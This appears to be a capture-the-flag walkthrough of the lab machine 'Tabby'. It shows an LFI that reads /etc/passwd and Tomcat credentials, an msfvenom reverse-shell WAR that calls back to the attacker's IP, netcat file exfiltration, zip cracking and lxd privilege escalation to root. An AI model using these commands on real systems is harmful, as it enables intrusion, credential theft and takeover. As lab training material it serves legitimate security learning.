# Tabby -OSPC Boxe

Owner: Leandre Brl

![Untitled](Tabby%20-OSPC%20Boxe%205adc856803654bc5a6b2b22cc200f8d0/Untitled.png)

## **Scanning :**

Run nmap scan to see open ports and services. 

```php
> nmap -A -Pn -T4 10.10.10.194

22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Mega Hosting
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http    Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
```

Scan all ports but i don’t find more open ports. 

```php
> nmap -p- -T5 -sS -n 10.10.10.194 --max-retries 1

22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
```

## **Enumerate web App :**

When i navigate on the web site a see the hostname of the machine megahosting.htb, so i must add it to my /etc/hosts file.

```php
echo "10.10.10.194 megahosting.htb" >> /etc/hosts
```

Enumerate the web file and directory with gobuster. 

```php
> gobuster dir -u http://10.10.10.194/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,js,txt,html -t50
```

Run whatweb to get more informations the web site technologies.

```php
> whatweb -a 3 http://megahosting.htb/        
                                      
http://megahosting.htb/ [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[sales@megahosting.com,sales@megahosting.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.194], JQuery[1.11.2], Modernizr[2.8.3-respond-1.4.2.min], Script, Title[Mega Hosting], X-UA-Compatible[IE=edge]
```

## **Exploit LFI :**

I find new endpoints on /new.php this endpoint meen to tell file name **`statement`**

![Untitled](Tabby%20-OSPC%20Boxe%205adc856803654bc5a6b2b22cc200f8d0/Untitled%201.png)

So i try to exploit LFI to leak internal file. 

```php
> news.php?file=../../../../etc/passwd
```

![Untitled](Tabby%20-OSPC%20Boxe%205adc856803654bc5a6b2b22cc200f8d0/Untitled%202.png)

Ok that a good and we know a tomcat app is setup on 8080.

![Untitled](Tabby%20-OSPC%20Boxe%205adc856803654bc5a6b2b22cc200f8d0/Untitled%203.png)

So thanks to the lfi i wil try to read `**tomcat-user.xml**` file because this file contain user and password for tomcat manager pannel.

I search on the internet where is located this file and i find this ressource. 

[Ubuntu – File list of package tomcat9/focal/all](https://packages.ubuntu.com/focal/all/tomcat9/filelist)

So lets try all this file and the good one is `**/usr/share/tomcat9/etc/tomcat-users.xml**`

```php
news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml
```

![Untitled](Tabby%20-OSPC%20Boxe%205adc856803654bc5a6b2b22cc200f8d0/Untitled%204.png)

Now to get rce it is possible upload war payload, so firt generate it with msfvenom.

```php
> msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.52 LPORT=4444 -f war -o shell.war
```

uplaod it with curl.

```php
> curl --upload-file shell.war -u 'tomcat:$3cureP4s5w0rd123!' "http://10.10.10.194:8080/manager/text/deploy?path=/shell"
```

Now go on `**/shell**` in the web app and get your reverse shell on port 4444.

![Untitled](Tabby%20-OSPC%20Boxe%205adc856803654bc5a6b2b22cc200f8d0/Untitled%205.png)

## **Tomcat to Ash :**

I run a quick linpeas to enumerate the system and i see informations about the user ash, this user is part a of group **`lxd`** that meen i can use technique our privileges to root. 

![Untitled](Tabby%20-OSPC%20Boxe%205adc856803654bc5a6b2b22cc200f8d0/Untitled%206.png)

But i are not yet ash.

I search some information in web file and i find a backup file named 16162020_backup.zip lets download it localy. 

```php
# on attacker machine
> nc -lnvp 4445 > backup.zip
# on victime machine
> nc 10.10.14.52 4445 < 16162020_backup.zip
```

I try to unzip the file it is protected by password, lets crack it with john.

```php
> zip2john backup.zip > zip.hash

> john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

I find the password is **`admin@it`**

Lets try move on ash with this password.

![Untitled](Tabby%20-OSPC%20Boxe%205adc856803654bc5a6b2b22cc200f8d0/Untitled%207.png)

I can generate a private key to login in using ssh protocole.

```php
> mkdir .ssh
> cd .ssh 
> ssh-keygen -t rsa
> cat id_rsa.pub > authorized_keys
```

Use the private key to login the server as ash user.

```php
> ssh -i id_rsa ash@10.10.10.194
```

## **Gain root :**

So to exploit the lxd group and escalate the root privilege of the host machine we have to create an image for lxd. 

So frist step download alpine image. 

```php
> git clone https://github.com/saghul/lxd-alpine-builder.git
```

Open a web server and downloads on the victim.

```php
# attacker
> python3 -m http.server 800
# victim
> wget http://10.10.14.52:800/alpine-v3.13-x86_64-20210218_0139.tar.gz
```

build the image. 

```php
> /snap/bin/lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias anii
```

look if the image is build. 

```php
> /snap/bin/lxc image list
```

now mount the container with the following command.

```php
/snap/bin/lxc init ani tabby -c security.privileged=true
```

But i get an error so i need to creat on new pool storage.

```php
# use default options 
> lxd init
```

Now run command to run containers and pop shell on this containers.

```php
> lxc init anii tabby -c security.privileged=true

> lxc config device add tabby mypool disk source=/ path=/mnt/root recursive=true

> lxc start tabby

> lxc exec tabby /bin/sh
```

Now read the flag it is located on initial disk as root privileges.

![Untitled](Tabby%20-OSPC%20Boxe%205adc856803654bc5a6b2b22cc200f8d0/Untitled%208.png)